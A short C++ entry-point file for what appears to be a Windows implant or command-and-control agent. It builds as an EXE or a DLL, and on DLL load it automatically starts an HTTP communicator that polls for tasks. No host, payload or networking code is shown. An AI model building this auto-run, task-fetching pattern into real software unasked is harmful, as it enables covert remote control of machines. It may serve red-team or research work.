#include "export.h"
#include "main.h"
#include <windows.h>
#include "communicator.h"

/*
Run() is responsible for starting and coordinating everything; can be called directly
*/
EXPORT_FUNC void Run() {
    HttpCommunicator communicator;
    communicator.GetTasks();
}

/*
main() function called when EXE starts
*/
void main(int argc, char** argv) {
    Run();
}

/*
DllMain() to be called by any process that loads this DLL
 */
EXPORT_FUNC BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch(fdwReason)
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
            Run();
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            if (lpvReserved != nullptr)
            {
                break; // do not do cleanup if process termination scenario
            }
            
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
